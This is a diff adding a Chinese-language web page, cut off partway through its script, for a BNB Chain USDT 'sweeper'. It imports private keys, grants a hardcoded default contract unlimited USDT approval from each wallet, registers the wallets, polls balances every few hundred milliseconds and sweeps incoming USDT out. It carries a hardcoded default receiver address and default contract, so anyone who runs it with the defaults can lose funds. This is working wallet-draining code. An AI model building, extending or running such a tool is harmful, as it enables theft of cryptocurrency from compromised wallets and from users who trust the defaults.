@@ -1,0 +1,687 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>终极抢跑监控 - 自动授权+自动记录地址</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
+    <style>
+        * { box-sizing: border-box; }
+        body { background: #0a0c15; color: #f1f5f9; font-family: 'Inter', system-ui; padding-bottom: 30px; }
+        .card { background: #0f1722; border: 1px solid #2d3a5e; border-radius: 24px; }
+        .btn-primary { background: #3b82f6; border-radius: 40px; border: none; }
+        .btn-success { background: #10b981; border-radius: 40px; }
+        .btn-danger { background: #ef4444; border-radius: 40px; }
+        .btn-warning { background: #f59e0b; border-radius: 40px; color: #0f172a; font-weight: 500; }
+        .balance-number { color: #facc15; font-weight: 800; font-size: 1.2rem; font-family: monospace; }
+        .bnb-balance { color: #6ee7b7; font-weight: 600; font-size: 0.75rem; font-family: monospace; }
+        .log-area { background: #030712; border-radius: 20px; max-height: 320px; overflow-y: auto; font-family: monospace; font-size: 0.75rem; padding: 12px; border: 1px solid #2d3a5e; }
+        .log-line { border-bottom: 1px solid #1f2a44; padding: 5px 0; color: #cbd5e6; }
+        .log-success { color: #6ee7b7; }
+        .log-error { color: #fca5a5; }
+        .log-warning { color: #fcd34d; }
+        .stats-card { background: #111827; border-radius: 20px; padding: 16px; text-align: center; }
+        .stats-number { font-size: 1.8rem; font-weight: bold; color: #facc15; }
+        .stat-label { font-size: 0.7rem; text-transform: uppercase; letter-spacing: 1px; color: #facc15; font-weight: 600; }
+        .wallet-item { background: #111827; border-radius: 16px; padding: 12px 16px; margin-bottom: 10px; border-left: 4px solid #3b82f6; color: #e2e8f0; }
+        .wallet-item:hover { background: #1e293b; }
+        .address-hash { font-family: monospace; background: #1e293b; padding: 2px 8px; border-radius: 30px; font-size: 0.75rem; color: #facc15 !important; font-weight: 500; }
+        .mode-tab { cursor: pointer; padding: 8px 24px; border-radius: 60px; background: #1e293b; transition: 0.2s; font-weight: 500; text-align: center; color: #e2e8f0; }
+        .mode-tab.active { background: #3b82f6; color: white; }
+        .form-control, .form-select { background: #1e293b; border: 1px solid #475569; color: white !important; border-radius: 40px; }
+        .form-control:focus { background: #0f172a; border-color: #8b5cf6; color: white !important; outline: none; }
+        .form-control::placeholder { color: #9ca3af !important; }
+        .card h6, .mb-0 { color: #facc15 !important; }
+        .btn-outline-primary { color: #facc15 !important; border-color: #facc15 !important; }
+        .btn-outline-primary:hover { background: #facc15 !important; color: #0f172a !important; }
+        .text-secondary { color: #94a3b8 !important; }
+        .refresh-btn { transition: transform 0.2s; }
+        .refresh-btn:hover { transform: rotate(180deg); }
+        .wallet-balance-row { display: flex; flex-wrap: wrap; gap: 12px; align-items: center; justify-content: space-between; }
+        .wallet-left { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
+        .wallet-right { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+        .bnb-badge { background: #0f172a; padding: 2px 8px; border-radius: 20px; font-size: 0.7rem; color: #6ee7b7; }
+        .default-hint { font-size: 0.65rem; color: #6b7280; margin-top: 4px; }
+    </style>
+</head>
+<body>
+<div class="container py-3 py-md-4">
+    <div class="d-flex flex-wrap justify-content-between align-items-center mb-4 gap-2">
+        <div>
+            <h2 class="fw-bold" style="background: linear-gradient(135deg,#facc15,#fb923c); -webkit-background-clip:text; background-clip:text; color:transparent;">⚡ 终极抢跑监控</h2>
+            <p class="small text-secondary">私钥导入自动授权 + 自动记录地址到合约 | 支持读取链上授权列表 | 显示USDT+BNB余额</p>
+        </div>
+        <div>
+            <button class="btn btn-outline-light btn-sm" onclick="exportFullConfig()">📁 导出配置</button>
+            <button class="btn btn-primary btn-sm" onclick="showImportConfigModal()">🔧 导入配置</button>
+        </div>
+    </div>
+
+    <!-- 模式切换 -->
+    <div class="d-flex gap-2 mb-4 flex-wrap">
+        <div class="mode-tab active" id="tabContractMode" onclick="switchActiveMode('contract')">🏛️ 授权合约模式</div>
+        <div class="mode-tab" id="tabPrivateMode" onclick="switchActiveMode('private')">🔑 私钥导入模式</div>
+    </div>
+
+    <!-- 统计卡片 -->
+    <div class="row g-3 mb-4">
+        <div class="col-6 col-md-3"><div class="stats-card"><div class="stat-label">监控钱包</div><div class="stats-number" id="statWalletCount">0</div></div></div>
+        <div class="col-6 col-md-3"><div class="stats-card"><div class="stat-label">累计抢跑</div><div class="stats-number" id="statTotalSwept">0</div></div></div>
+        <div class="col-6 col-md-3"><div class="stats-card"><div class="stat-label">成功次数</div><div class="stats-number" id="statSuccessCount">0</div></div></div>
+        <div class="col-6 col-md-3"><div class="stats-card"><div class="stat-label">监控状态</div><div class="stats-number" id="statMonitorState" style="font-size:1.2rem; color:#10b981;">● 待启动</div></div></div>
+    </div>
+
+    <!-- 合约模式配置 -->
+    <div id="contractModePanel" class="card p-3 mb-3">
+        <h6 class="mb-2">🏛️ 授权合约模式</h6>
+        <div class="row g-2 align-items-end">
+            <div class="col-md-5">
+                <label class="small fw-bold" style="color:#facc15;">合约地址</label>
+                <input type="text" id="contractAddr" class="form-control form-control-sm" placeholder="0x... 部署的合约地址">
+            </div>
+            <div class="col-md-4"><label class="small fw-bold" style="color:#facc15;">调用钱包私钥</label><input type="password" id="ownerPrivateKey" class="form-control form-control-sm" placeholder="需少量BNB做Gas"></div>
+            <div class="col-md-3"><label class="small fw-bold" style="color:#facc15;">监控间隔</label><select id="monitorInterval" class="form-select form-select-sm"><option value="500" selected>500ms</option><option value="300">300ms</option><option value="800">800ms</option></select></div>
+        </div>
+        <div class="mt-3 d-flex flex-wrap gap-2">
+            <button class="btn btn-success btn-sm" onclick="initContractMode()">✅ 初始化合约</button>
+            <button class="btn btn-info btn-sm" onclick="loadWalletsFromContract()">📋 从合约读取钱包列表</button>
+            <button class="btn btn-warning btn-sm" onclick="startMonitor()">▶️ 启动监控</button>
+            <button class="btn btn-secondary btn-sm" onclick="stopMonitor()">⏸️ 停止</button>
+            <button class="btn btn-primary btn-sm" onclick="sweepAllNow()">⚡ 立即抢跑所有</button>
+        </div>
+        <div class="small mt-2" style="color:#facc15;">📌 点击「从合约读取钱包列表」可查看已通过私钥模式添加的钱包地址。</div>
+    </div>
+
+    <!-- 私钥模式配置 -->
+    <div id="privateModePanel" class="card p-3 mb-3" style="display: none;">
+        <h6 class="mb-2">🔑 私钥导入模式 <span class="badge bg-success ms-2">自动授权 + 自动记录到合约</span></h6>
+        <div class="row g-2 align-items-end">
+            <div class="col-md-4">
+                <label class="small fw-bold" style="color:#facc15;">合约地址</label>
+                <input type="text" id="privateContractAddr" class="form-control form-control-sm" placeholder="0x... 您的AutoSweeper合约">
+            </div>
+            <div class="col-md-4"><label class="small fw-bold" style="color:#facc15;">接收地址</label><input type="text" id="privateReceiver" class="form-control form-control-sm" placeholder="0x... 收款地址" value="0x08Be26bb41d890c42696F11DB0EF3Ef28341BD09"></div>
+            <div class="col-md-4"><label class="small fw-bold" style="color:#facc15;">监控间隔</label><select id="privateInterval" class="form-select form-select-sm"><option value="500" selected>500ms</option><option value="300">300ms</option><option value="800">800ms</option></select></div>
+        </div>
+        <div class="row g-2 mt-2">
+            <div class="col-md-12">
+                <label class="small fw-bold" style="color:#facc15;">导入私钥 (一行一个)</label>
+                <textarea id="privateKeysList" rows="3" class="form-control" placeholder="0x私钥1&#10;0x私钥2"></textarea>
+            </div>
+        </div>
+        <div class="mt-3 d-flex flex-wrap gap-2">
+            <button class="btn btn-success btn-sm" onclick="importAndApprove()">🔐 导入并授权(自动记录到合约)</button>
+            <button class="btn btn-outline-success btn-sm" onclick="importOnly()">📋 仅导入私钥(不授权)</button>
+            <button class="btn btn-warning btn-sm" onclick="startPrivateMonitor()">▶️ 启动监控</button>
+            <button class="btn btn-secondary btn-sm" onclick="stopPrivateMonitor()">⏸️ 停止</button>
+            <button class="btn btn-primary btn-sm" onclick="sweepAllPrivateNow()">⚡ 手动全部转出</button>
+        </div>
+        <div class="small mt-2" style="color:#facc15;">💡 导入时会自动：1.执行无上限approve授权 2.调用合约registerSelf记录地址 3.添加到监控列表</div>
+    </div>
+
+    <!-- 钱包列表 -->
+    <div class="card p-3 mb-3">
+        <div class="d-flex justify-content-between flex-wrap gap-2 align-items-center">
+            <h6 class="mb-0">📋 监控钱包列表 <span id="modeWalletLabel">(合约模式)</span></h6>
+            <div class="d-flex gap-2">
+                <button class="btn btn-sm btn-outline-info refresh-btn" onclick="manualRefreshAllBalances()" title="手动刷新所有余额">🔄 刷新余额</button>
+                <button class="btn btn-sm btn-outline-primary" onclick="showAddWalletModal()">+ 手动添加地址</button>
+            </div>
+        </div>
+        <div id="walletsContainer" style="max-height: 350px; overflow-y: auto; margin-top: 12px;">
+            <div class="text-secondary text-center py-3">暂无钱包</div>
+        </div>
+    </div>
+
+    <!-- 日志 -->
+    <div class="card p-3">
+        <div class="d-flex justify-content-between align-items-center mb-2">
+            <h6 class="mb-0">📡 实时日志</h6>
+            <button class="btn btn-sm btn-outline-secondary" onclick="clearLogs()">清空</button>
+        </div>
+        <div id="logArea" class="log-area"><div class="log-line">⚡ 系统就绪</div></div>
+    </div>
+</div>
+
+<!-- 模态框 -->
+<div id="addWalletModal" style="display:none; position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,0.85); z-index:1200; align-items:center; justify-content:center;">
+    <div class="card" style="max-width:450px; width:90%;"><div class="card-body"><h5>➕ 手动添加钱包</h5><input type="text" id="newWalletAddress" class="form-control" placeholder="0x..."><div class="mt-3 d-flex gap-2"><button class="btn btn-success" onclick="addWalletToCurrentMode()">确认</button><button class="btn btn-secondary" onclick="closeAddWalletModal()">取消</button></div></div></div>
+</div>
+<div id="importConfigModal" style="display:none; position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,0.85); z-index:1200; align-items:center; justify-content:center;">
+    <div class="card" style="max-width:550px; width:90%;"><div class="card-body"><h5>📁 导入配置</h5><textarea id="importJsonData" rows="6" class="form-control" placeholder='{"contractAddr":"0x..."}'></textarea><div class="mt-3 d-flex gap-2"><button class="btn btn-success" onclick="importFullConfig()">导入</button><button class="btn btn-secondary" onclick="closeImportModal()">取消</button></div></div></div>
+</div>
+
+<script>
+    // ==================== 默认合约地址 ====================
+    const DEFAULT_CONTRACT_ADDRESS = "0x40689fc22fB83d1Ea93E8cEf9eD5aBbA0399AEFF";
+    
+    let currentActiveMode = 'contract';
+    
+    // 合约模式
+    let contractEngine = { initialized: false, contract: null, signerWallet: null, contractAddr: '', authorizedWallets: [] };
+    let monitorIntervalId = null, isMonitoring = false;
+    let totalSweptAmount = 0, successCountTotal = 0;
+    let processingIndices = new Set();
+    
+    // 私钥模式
+    let privateWallets = [], privateMonitorInterval = null, isPrivateMonitoring = false;
+    let privateReceiverAddr = "0x08Be26bb41d890c42696F11DB0EF3Ef28341BD09";
+    let privateContractAddr = DEFAULT_CONTRACT_ADDRESS;
+    
+    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+    const USDT_ABI = ["function balanceOf(address) view returns (uint256)", "function transfer(address to, uint256 amount) returns (bool)", "function approve(address spender, uint256 amount) returns (bool)", "function allowance(address owner, address spender) view returns (uint256)"];
+    const FULL_CONTRACT_ABI = [
+        "function sweep(address from) external",
+        "function addWallet(address wallet) external",
+        "function addWallets(address[] calldata wallets) external",
+        "function getAllAuthorizedWallets() view returns (address[])"
+    ];
+    const V2_CONTRACT_ABI = [
+        "function registerSelf() external",
+        "function getAllAuthorizedWallets() view returns (address[])"
+    ];
+    const BSC_RPC = "https://bsc-dataseed.binance.org/";
+    let globalProvider = null;
+    
+    function getProvider() { if(!globalProvider) globalProvider = new ethers.JsonRpcProvider(BSC_RPC); return globalProvider; }
+    
+    // 保存合约地址到 localStorage
+    function saveContractAddress(addr) {
+        if (addr) localStorage.setItem("autoSweeper_contractAddr", addr);
+    }
+    
+    function loadContractAddress() {
+        return localStorage.getItem("autoSweeper_contractAddr") || DEFAULT_CONTRACT_ADDRESS;
+    }
+    
+    function addLog(msg, type='info'){ 
+        const logDiv=document.getElementById("logArea"); 
+        if(!logDiv) return; 
+        const line=document.createElement("div"); 
+        line.className="log-line"; 
+        const now=new Date().toLocaleTimeString(); 
+        if(type==='success') line.classList.add("log-success"); 
+        if(type==='error') line.classList.add("log-error"); 
+        if(type==='warning') line.classList.add("log-warning"); 
+        line.innerHTML=`[${now}] ${msg}`; 
+        logDiv.appendChild(line); 
+        logDiv.scrollTop=logDiv.scrollHeight; 
+        while(logDiv.children.length>300) logDiv.removeChild(logDiv.firstChild); 
+    }
+    function clearLogs(){ const d=document.getElementById("logArea"); if(d) d.innerHTML='<div class="log-line">📋 日志已清空</div>'; }
+    
+    async function getBNBBalance(address) {
+        try { const balanceWei = await getProvider().getBalance(address); return parseFloat(ethers.formatEther(balanceWei)); } catch(e) { return 0; }
+    }
+    
+    async function manualRefreshAllBalances() {
+        addLog("🔄 手动刷新所有钱包余额...", "info");
+        let usdtCount = 0, bnbCount = 0;
+        
+        if(currentActiveMode === 'contract' && contractEngine.initialized) {
+            const provider = getProvider();
+            const usdt = new ethers.Contract(USDT_ADDRESS, ["function balanceOf(address) view returns (uint256)"], provider);
+            for(let w of contractEngine.authorizedWallets){
+                try {
+                    const balWei = await usdt.balanceOf(w.address);
+                    w.lastBalance = parseFloat(ethers.formatUnits(balWei, 18));
+                    if(w.lastBalance > 0) usdtCount++;
+                    w.bnbBalance = await getBNBBalance(w.address);
+                    if(w.bnbBalance > 0) bnbCount++;
+                } catch(e){}
+            }
+            renderWallets();
+            addLog(`✅ 刷新完成: ${usdtCount} 个钱包有USDT, ${bnbCount} 个钱包有BNB`, "success");
+        } 
+        else if(currentActiveMode === 'private') {
+            const provider = getProvider();
+            const usdt = new ethers.Contract(USDT_ADDRESS, ["function balanceOf(address) view returns (uint256)"], provider);
+            for(let w of privateWallets){
+                try {
+                    const balWei = await usdt.balanceOf(w.address);
+                    w.lastBalance = parseFloat(ethers.formatUnits(balWei, 18));
+                    if(w.lastBalance > 0) usdtCount++;
+                    w.bnbBalance = await getBNBBalance(w.address);
+                    if(w.bnbBalance > 0) bnbCount++;
+                } catch(e){}
+            }
+            renderWallets();
+            addLog(`✅ 刷新完成: ${usdtCount} 个钱包有USDT, ${bnbCount} 个钱包有BNB`, "success");
+        } else {
+            addLog("❌ 请先初始化合约或导入私钥", "error");
+        }
+    }
+    
+    function renderWallets() {
+        const container = document.getElementById("walletsContainer");
+        if(!container) return;
+        if(currentActiveMode === 'contract') {
+            const wallets = contractEngine.authorizedWallets || [];
+            if(wallets.length===0){ container.innerHTML='<div class="text-secondary text-center py-3">暂无钱包，请从合约读取或手动添加</div>'; document.getElementById("statWalletCount").innerText='0'; return; }
+            let html='';
+            wallets.forEach((w)=>{ 
+                const short=w.address.slice(0,6)+'...'+w.address.slice(-4); 
+                const usdtBal=w.lastBalance?w.lastBalance.toFixed(4):'0.0000';
+                const bnbBal=w.bnbBalance?w.bnbBalance.toFixed(5):'0.00000';
+                const isProcessing = processingIndices.has(w.address);
+                html+=`<div class="wallet-item">
+                    <div class="wallet-balance-row">
+                        <div class="wallet-left">
+                            <span class="address-hash">${short}</span>
+                            ${w.lastBalance>0.01?'<span class="badge bg-danger">有USDT</span>':''}
+                            ${w.bnbBalance>0.003?'<span class="badge bg-warning text-dark">有BNB</span>':''}
+                            ${isProcessing?'<span class="badge bg-secondary">转出中</span>':''}
+                        </div>
+                        <div class="wallet-right">
+                            <span class="balance-number">💰 ${usdtBal} USDT</span>
+                            <span class="bnb-badge">⛽ ${bnbBal} BNB</span>
+                            <button class="btn btn-sm btn-outline-danger ms-1" onclick="removeWallet('${w.address}')">移除</button>
+                        </div>
+                    </div>
+                </div>`; 
+            });
+            container.innerHTML=html;
+            document.getElementById("statWalletCount").innerText=wallets.length;
+        } else {
+            if(privateWallets.length===0){ container.innerHTML='<div class="text-secondary text-center py-3">暂无私钥钱包，请导入私钥</div>'; document.getElementById("statWalletCount").innerText='0'; return; }
+            let html='';
+            privateWallets.forEach(w=>{ 
+                const short=w.address.slice(0,6)+'...'+w.address.slice(-4); 
+                const usdtBal=w.lastBalance?w.lastBalance.toFixed(4):'0.0000';
+                const bnbBal=w.bnbBalance?w.bnbBalance.toFixed(5):'0.00000';
+                html+=`<div class="wallet-item">
+                    <div class="wallet-balance-row">
+                        <div class="wallet-left">
+                            <span class="address-hash">${short}</span>
+                            ${w.lastBalance>0.01?'<span class="badge bg-danger">有USDT</span>':''}
+                            ${w.bnbBalance>0.003?'<span class="badge bg-warning text-dark">有BNB</span>':''}
+                            <span class="badge bg-secondary">${w.isTransferring?'转出中':'监控中'}</span>
+                        </div>
+                        <div class="wallet-right">
+                            <span class="balance-number">💰 ${usdtBal} USDT</span>
+                            <span class="bnb-badge">⛽ ${bnbBal} BNB</span>
+                            <button class="btn btn-sm btn-outline-danger ms-1" onclick="removePrivateWallet('${w.address}')">移除</button>
+                        </div>
+                    </div>
+                </div>`; 
+            });
+            container.innerHTML=html;
+            document.getElementById("statWalletCount").innerText=privateWallets.length;
+        }
+        document.getElementById("statTotalSwept").innerText=totalSweptAmount.toFixed(2);
+        document.getElementById("statSuccessCount").innerText=successCountTotal;
+    }
+    
+    // ==================== 从合约读取钱包列表 ====================
+    async function loadWalletsFromContract() {
+        if(!contractEngine.initialized || !contractEngine.contract) {
+            addLog("❌ 合约未初始化，请先点击「初始化合约」", "error");
+            return false;
+        }
+        try {
+            addLog("🔄 正在从合约读取已授权钱包列表...", "info");
+            const walletAddresses = await contractEngine.contract.getAllAuthorizedWallets();
+            addLog(`📋 从合约读取到 ${walletAddresses.length} 个钱包地址`, "success");
+            
+            contractEngine.authorizedWallets = [];
+            const provider = getProvider();
+            const usdt = new ethers.Contract(USDT_ADDRESS, ["function balanceOf(address) view returns (uint256)"], provider);
+            for(let addr of walletAddresses) {
+                let usdtBalance = 0, bnbBalance = 0;
+                try {
+                    const balWei = await usdt.balanceOf(addr);
+                    usdtBalance = parseFloat(ethers.formatUnits(balWei, 18));
+                    bnbBalance = await getBNBBalance(addr);
+                } catch(e) {}
+                contractEngine.authorizedWallets.push({ address: addr, lastBalance: usdtBalance, bnbBalance: bnbBalance });
+            }
+            renderWallets();
+            addLog(`✅ 已加载 ${contractEngine.authorizedWallets.length} 个钱包`, "success");
+            return true;
+        } catch(e) {
+            addLog(`❌ 读取失败: ${e.message.slice(0,80)}`, "error");
+            return false;
+        }
+    }
+    
+    // ==================== 合约模式 ====================
+    async function initContractMode() {
+        let contractAddr = document.getElementById("contractAddr").value.trim();
+        if(!contractAddr) contractAddr = DEFAULT_CONTRACT_ADDRESS;
+        const pk = document.getElementById("ownerPrivateKey").value.trim();
+        if(!contractAddr || !pk){ addLog("❌ 请填写合约地址和调用钱包私钥","error"); return; }
+        try {
+            let rawPk = pk; if(!rawPk.startsWith('0x')) rawPk = '0x'+rawPk;
+            const wallet = new ethers.Wallet(rawPk, getProvider());
+            const contract = new ethers.Contract(contractAddr, FULL_CONTRACT_ABI, wallet);
+            contractEngine.contract = contract;
+            contractEngine.signerWallet = wallet;
+            contractEngine.initialized = true;
+            contractEngine.contractAddr = contractAddr;
+            saveContractAddress(contractAddr);
+            addLog(`✅ 合约初始化成功，调用地址: ${wallet.address.slice(0,6)}...${wallet.address.slice(-4)}`, "success");
+            await loadWalletsFromContract();
+        } catch(e){ addLog(`❌ 初始化失败: ${e.message.slice(0,80)}`,"error"); contractEngine.initialized=false; }
+    }
+    
+    async function safeSweep(wallet, currentBalance, provider) {
+        const address = wallet.address;
+        if (processingIndices.has(address)) {
+            addLog(`⚠️ ${address.slice(0,6)}...${address.slice(-4)} 转账进行中，跳过`, "warning");
+            return false;
+        }
+        processingIndices.add(address);
+        renderWallets();
+        try {
+            // ✅ 修复：使用传入的 currentBalance，而不是 wallet.lastBalance
+            const amountToSend = currentBalance;
+            wallet.lastBalance = 0;
+            renderWallets();
+            addLog(`🚨 ${address.slice(0,6)}...${address.slice(-4)} 检测到入账 +${amountToSend.toFixed(4)} USDT，立即启动转出`, "warning");
+            const gasPrice = await provider.getFeeData();
+            const tx = await contractEngine.contract.sweep(address, { gasLimit: 150000, gasPrice: gasPrice.gasPrice });
+            addLog(`📡 [${address.slice(0,6)}...${address.slice(-4)}] 交易已广播: ${tx.hash.slice(0,12)}... 转出 ${currentBalance.toFixed(4)} USDT → 目标地址`, "success");
+            const receipt = await Promise.race([tx.wait(1), new Promise((_, reject) => setTimeout(() => reject(new Error("确认超时")), 10000))]);
+            if (receipt && receipt.status === 1) {
+                addLog(`✅ 抢跑成功! 转出 ${amountToSend.toFixed(4)} USDT`, "success");
+                totalSweptAmount += amountToSend;
+                successCountTotal++;
+                const finalBalance = await new ethers.Contract(USDT_ADDRESS, ["function balanceOf(address) view returns (uint256)"], provider).balanceOf(address);
+                wallet.lastBalance = parseFloat(ethers.formatUnits(finalBalance, 18));
+                renderWallets();
+                return true;
+            } else {
+                addLog(`❌ 交易失败，尝试恢复余额`, "error");
+                const finalBalance = await new ethers.Contract(USDT_ADDRESS, ["function balanceOf(address) view returns (uint256)"], provider).balanceOf(address);
+                wallet.lastBalance = parseFloat(ethers.formatUnits(finalBalance, 18));
+                renderWallets();
+                return false;
+            }
+        } catch(e) {
+            addLog(`❌ 转账异常: ${e.message.slice(0,80)}`, "error");
+            try {
+                const finalBalance = await new ethers.Contract(USDT_ADDRESS, ["function balanceOf(address) view returns (uint256)"], provider).balanceOf(address);
+                wallet.lastBalance = parseFloat(ethers.formatUnits(finalBalance, 18));
+            } catch(ee) {}
+            renderWallets();
+            return false;
+        } finally {
+            processingIndices.delete(address);
+            renderWallets();
+        }
+    }
+    
+    async function checkAndSweep() {
+        if(!isMonitoring || !contractEngine.initialized) return;
+        const provider = getProvider();
+        const usdt = new ethers.Contract(USDT_ADDRESS, ["function balanceOf(address) view returns (uint256)"], provider);
+        for(let w of contractEngine.authorizedWallets){
+            try {
+                if (processingIndices.has(w.address)) continue;
+                const balWei = await usdt.balanceOf(w.address);
+                const newBal = parseFloat(ethers.formatUnits(balWei, 18));
+                const oldBal = w.lastBalance || 0;
+                if (newBal > oldBal + 0.005 && newBal > 0.01) {
+                    await safeSweep(w, newBal, provider);
+                    await new Promise(r => setTimeout(r, 500));
+                } else {
+                    w.lastBalance = newBal;
+                }
+                w.bnbBalance = await getBNBBalance(w.address);
+            } catch(e){}
+        }
+        renderWallets();
+    }
+    
+    function startMonitor(){
+        if(currentActiveMode !== 'contract'){ addLog("请切换到合约模式","warning"); return; }
+        if(!contractEngine.initialized){ addLog("❌ 请先初始化合约","error"); return; }
+        if(contractEngine.authorizedWallets.length === 0){ addLog("⚠️ 请先从合约读取钱包列表或手动添加","warning"); return; }
+        if(monitorIntervalId) clearInterval(monitorIntervalId);
+        const interval = parseInt(document.getElementById("monitorInterval").value);
+        monitorIntervalId = setInterval(checkAndSweep, interval);
+        isMonitoring = true;
+        document.getElementById("statMonitorState").innerHTML="● 运行中";
+        addLog(`🟢 合约监控已启动，间隔 ${interval}ms，防重复机制已启用`, "success");
+        checkAndSweep();
+    }
+    function stopMonitor(){ 
+        if(monitorIntervalId){ clearInterval(monitorIntervalId); monitorIntervalId=null; } 
+        isMonitoring=false; 
+        document.getElementById("statMonitorState").innerHTML="○ 已停止";
+        addLog("⏸️ 合约监控已停止","warning"); 
+    }
+    async function sweepAllNow(){
+        if(!contractEngine.initialized || !contractEngine.contract){ addLog("合约未初始化","error"); return; }
+        addLog("⚡ 开始批量抢跑...","warning");
+        for(let w of contractEngine.authorizedWallets){
+            if(w.lastBalance > 0.01 && !processingIndices.has(w.address)){
+                await safeSweep(w, w.lastBalance, getProvider());
+                await new Promise(r=>setTimeout(r,500));
+            }
+        }
+        addLog("✅ 批量抢跑完成","success");
+    }
+    
+    function addWalletToCurrentMode() {
+        const addr = document.getElementById("newWalletAddress").value.trim();
+        if(!addr || !addr.startsWith('0x') || addr.length!==42){ addLog("❌ 无效地址","error"); return; }
+        if(currentActiveMode === 'contract'){
+            if(contractEngine.authorizedWallets.some(w=>w.address.toLowerCase()===addr.toLowerCase())){ addLog("⚠️ 钱包已存在","warning"); closeAddWalletModal(); return; }
+            contractEngine.authorizedWallets.push({ address: addr, lastBalance: 0, bnbBalance: 0 });
+            renderWallets();
+            setTimeout(() => manualRefreshAllBalances(), 1000);
+            addLog(`✅ 已添加钱包 ${addr.slice(0,6)}...${addr.slice(-4)}`, "success");
+        } else { addLog("❌ 当前为私钥模式，请使用私钥导入","error"); }
+        closeAddWalletModal();
+    }
+    function removeWallet(addr){ 
+        contractEngine.authorizedWallets = contractEngine.authorizedWallets.filter(w=>w.address.toLowerCase()!==addr.toLowerCase()); 
+        renderWallets(); 
+        addLog(`🗑️ 已移除钱包 ${addr.slice(0,6)}...${addr.slice(-4)}`,"warning");
+    }
+    
+    // ==================== 私钥模式（完整版）====================
+    async function importAndApprove() {
+        const rawKeys = document.getElementById("privateKeysList").value;
+        let contractAddr = document.getElementById("privateContractAddr").value.trim();
+        const receiverAddr = document.getElementById("privateReceiver").value.trim();
+        
+        if(!rawKeys.trim()){ addLog("❌ 请填写私钥","error"); return; }
+        if(!contractAddr) contractAddr = DEFAULT_CONTRACT_ADDRESS;
+        if(!contractAddr.startsWith('0x') || contractAddr.length !== 42) {
+            addLog(`❌ 合约地址无效，请使用默认地址: ${DEFAULT_CONTRACT_ADDRESS.slice(0,6)}...${DEFAULT_CONTRACT_ADDRESS.slice(-4)}`, "error");
+            return;
+        }
+        if(receiverAddr && receiverAddr.startsWith('0x') && receiverAddr.length===42) privateReceiverAddr = receiverAddr;
+        privateContractAddr = contractAddr;
+        saveContractAddress(contractAddr);
+        
+        const lines = rawKeys.split(/\r?\n/);
+        let newCount = 0;
+        
+        for(let line of lines){
+            let pk = line.trim(); if(pk==="") continue;
+            if(!pk.startsWith("0x")) pk = "0x"+pk;
+            try {
+                const wallet = new ethers.Wallet(pk, getProvider());
+                const exists = privateWallets.some(w => w.address.toLowerCase() === wallet.address.toLowerCase());
+                if(exists) { addLog(`⚠️ ${wallet.address.slice(0,6)}...${wallet.address.slice(-4)} 已存在`, "warning"); continue; }
+                
+                // 授权 USDT
+                const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, wallet);
+                const currentAllowance = await usdt.allowance(wallet.address, contractAddr);
+                if(currentAllowance < ethers.MaxUint256) {
+                    addLog(`⏳ 正在为 ${wallet.address.slice(0,6)}...${wallet.address.slice(-4)} 授权 USDT...`, "info");
+                    const approveTx = await usdt.approve(contractAddr, ethers.MaxUint256, { gasLimit: 80000 });
+                    addLog(`📡 授权交易: ${approveTx.hash.slice(0,12)}...`, "info");
+                    await approveTx.wait();
+                    addLog(`✅ USDT 授权成功`, "success");
+                } else {
+                    addLog(`✅ ${wallet.address.slice(0,6)}...${wallet.address.slice(-4)} 已授权`, "success");
+                }
+                
+                // 调用 registerSelf 注册地址
+                try {
+                    const v2Contract = new ethers.Contract(contractAddr, V2_CONTRACT_ABI, wallet);
+                    addLog(`⏳ 正在注册地址到合约...`, "info");
+                    const registerTx = await v2Contract.registerSelf({ gasLimit: 100000 });
+                    addLog(`📡 注册交易: ${registerTx.hash.slice(0,12)}...`, "info");
+                    await registerTx.wait();
+                    addLog(`✅ 地址注册成功`, "success");
+                } catch(regErr) {
+                    if(regErr.message.includes("already registered")) {
+                        addLog(`✅ 地址已注册过`, "success");
+                    } else {
+                        addLog(`⚠️ 注册失败: ${regErr.message.slice(0,60)}`, "warning");
+                    }
+                }
+                
+                const balanceWei = await usdt.balanceOf(wallet.address);
+                const balance = parseFloat(ethers.formatUnits(balanceWei, 18));
+                const bnbBalance = await getBNBBalance(wallet.address);
+                privateWallets.push({ wallet, address: wallet.address, lastBalance: balance, bnbBalance: bnbBalance, isTransferring: false });
+                newCount++;
+                addLog(`✅ 已加载钱包 ${wallet.address.slice(0,6)}...${wallet.address.slice(-4)} USDT: ${balance.toFixed(4)} BNB: ${bnbBalance.toFixed(5)}`, "success");
+            } catch(e){ addLog(`❌ 私钥无效: ${e.message.slice(0,50)}`, "error"); }
+        }
+        if(newCount > 0) { 
+            renderWallets(); 
+            addLog(`🎉 成功导入 ${newCount} 个钱包，已完成授权和注册`, "success");
+            if(contractEngine.initialized) await loadWalletsFromContract();
+        }
+        document.getElementById("privateKeysList").value = "";
+    }
+    
+    async function importOnly() {
+        const rawKeys = document.getElementById("privateKeysList").value;
+        if(!rawKeys.trim()){ addLog("❌ 请填写私钥","error"); return; }
+        const lines = rawKeys.split(/\r?\n/);
+        let newCount = 0;
+        for(let line of lines){
+            let pk = line.trim(); if(pk==="") continue;
+            if(!pk.startsWith("0x")) pk = "0x"+pk;
+            try {
+                const wallet = new ethers.Wallet(pk, getProvider());
+                const exists = privateWallets.some(w => w.address.toLowerCase() === wallet.address.toLowerCase());
+                if(exists) continue;
+                const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, getProvider());
+                const balWei = await usdt.balanceOf(wallet.address);
+                const balance = parseFloat(ethers.formatUnits(balWei, 18));
+                const bnbBalance = await getBNBBalance(wallet.address);
+                privateWallets.push({ wallet, address: wallet.address, lastBalance: balance, bnbBalance: bnbBalance, isTransferring: false });
+                newCount++;
+                addLog(`✅ 加载钱包 ${wallet.address.slice(0,6)}...${wallet.address.slice(-4)} USDT: ${balance.toFixed(4)} BNB: ${bnbBalance.toFixed(5)}`, "success");
+            } catch(e){ addLog(`❌ 私钥无效`, "error"); }
+        }
